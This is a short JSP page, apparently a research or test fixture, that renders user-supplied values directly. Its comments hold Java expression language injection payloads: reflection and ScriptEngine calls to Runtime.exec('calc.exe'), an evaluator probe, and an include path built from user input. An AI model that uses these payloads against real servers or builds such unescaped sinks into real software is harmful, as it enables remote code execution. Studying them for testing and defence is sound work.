<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Static Resolver</title>
    </head>
    <body>
        <p>Static Resolver</p>
        <h1>${text}</h1>
	    <h2>${user.name}</h2>
    </body>
    <%--Method Reflection Invoke: ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
    Script Engine Manager: ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"calc.exe\\\")")}
    Script Engine Manager Sleep: ${ }${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("text")}"}--%>
    
    <%-- Page Context: ${pageContext}<br />
    Expression Evaluator: ${pageContext.expressionEvaluator.evaluate("${7*7}", Object.class, null, null)}<br />
    Expression Evaluator2: ${pageContext.jspApplicationContext}<br />
    Test: &#36;{text}
    Request: ${request}<br />
    Context Path: ${pageContext.request.contextPath}
    
    <jsp:include page="${text}-acb123-${user.name}"/> --%>
</html>
